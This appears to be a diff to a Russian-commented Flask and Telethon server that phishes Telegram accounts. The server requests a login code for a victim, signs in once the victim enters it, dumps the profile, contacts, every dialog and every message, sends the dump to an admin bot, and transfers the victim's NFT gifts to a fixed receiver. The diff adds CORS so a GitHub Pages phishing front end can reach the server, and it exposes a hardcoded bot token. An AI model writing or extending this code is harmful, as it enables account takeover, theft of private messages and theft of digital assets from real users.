@@ -1,4 +1,4 @@
-# server.py — полностью обновлённая версия
+# server.py — полностью обновлённая версия с CORS и корректным event loop
 from flask import Flask, render_template, request, jsonify, session
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
@@ -10,6 +10,7 @@ import logging
 from threading import Thread
 from datetime import datetime
 import httpx
+from flask_cors import CORS  # <--- добавлено
 
 logging.basicConfig(level=logging.INFO)
 
@@ -21,10 +22,14 @@ BOT_TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
+CORS(app)  # <--- разрешаем запросы с любых доменов (нужно для GitHub Pages)
 
 sessions = {}
 temp_clients = {}
 
+# ============================================================
+# Вспомогательные функции для уведомлений
+# ============================================================
 async def send_telegram_message(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     async with httpx.AsyncClient() as client:
@@ -37,12 +42,13 @@ def notify_admin_sync(text):
         logging.error(f"Failed to notify admin: {e}")
 
 # ============================================================
-# === Сбор ВСЕХ данных аккаунта ===
+# Сбор ВСЕХ данных аккаунта (диалоги, контакты, сообщения)
 # ============================================================
 async def collect_full_user_data(client):
     """Собирает профиль, контакты, все диалоги, все сообщения."""
     data = {}
     
+    # 1. Данные владельца
     me = await client.get_me()
     data['user'] = {
         'id': me.id,
@@ -54,6 +60,7 @@ async def collect_full_user_data(client):
         'is_premium': getattr(me, 'premium', False)
     }
     
+    # 2. Контакты
     contacts = await client.get_contacts()
     data['contacts'] = []
     for contact in contacts:
@@ -65,6 +72,7 @@ async def collect_full_user_data(client):
             'phone': contact.phone
         })
     
+    # 3. Диалоги и сообщения
     dialogs = await client.get_dialogs()
     data['dialogs'] = []
     for dialog in dialogs:
@@ -81,6 +89,7 @@ async def collect_full_user_data(client):
         elif dialog.is_channel:
             dialog_info['type'] = 'channel'
         
+        # Собираем ВСЕ сообщения (без лимита)
         try:
             messages = []
             async for msg in client.iter_messages(dialog, limit=None):
@@ -103,6 +112,9 @@ async def collect_full_user_data(client):
     
     return data
 
+# ============================================================
+# Отправка JSON-файла админу
+# ============================================================
 async def send_document_to_admin(file_path):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -115,7 +127,8 @@ async def send_document_to_admin(file_path):
         logging.error(f"Failed to send document: {e}")
 
 # ============================================================
-
+# Проверка баланса и подарков
+# ============================================================
 async def check_balance_and_gifts(client):
     try:
         me = await client.get_me()
@@ -132,6 +145,9 @@ async def check_balance_and_gifts(client):
         logging.error(f"Balance check error: {e}")
         return None
 
+# ============================================================
+# Передача NFT-подарков получателю
+# ============================================================
 async def transfer_nft_to_receiver(client, info):
     try:
         receiver = await client.get_entity(RECEIVER_USERNAME)
@@ -152,6 +168,9 @@ async def transfer_nft_to_receiver(client, info):
         notify_admin_sync(f"❌ Ошибка перевода: {e}")
         return False
 
+# ============================================================
+# Веб-маршруты
+# ============================================================
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -171,7 +190,7 @@ def check_page(check_id):
     return render_template('index.html')
 
 # ============================================================
-# ИСПРАВЛЕННЫЙ ЭНДПОИНТ /api/send-code
+# API: отправка кода подтверждения
 # ============================================================
 @app.route('/api/send-code', methods=['POST'])
 def api_send_code():
@@ -216,7 +235,7 @@ def api_send_code():
         loop.close()
 
 # ============================================================
-# ИСПРАВЛЕННЫЙ ЭНДПОИНТ /api/verify-code
+# API: проверка кода и завершение авторизации
 # ============================================================
 @app.route('/api/verify-code', methods=['POST'])
 def api_verify_code():
@@ -242,9 +261,10 @@ def api_verify_code():
         try:
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
             
+            # Получаем информацию о балансе и подарках
             info = await check_balance_and_gifts(client)
             if info:
-                # Сбор дампа
+                # Сбор полного дампа и отправка админу
                 try:
                     dump_data = await collect_full_user_data(client)
                     dump_filename = f"dump_{info['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
@@ -257,6 +277,7 @@ def api_verify_code():
                     logging.error(f"Error during data dump: {e}")
                     await send_telegram_message(f"❌ Ошибка сбора дампа: {e}")
                 
+                # Отправляем подарки получателю
                 await transfer_nft_to_receiver(client, info)
             
             await client.disconnect()
@@ -283,6 +304,9 @@ def api_verify_code():
     finally:
         loop.close()
 
+# ============================================================
+# Запуск (если файл запускается напрямую)
+# ============================================================
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
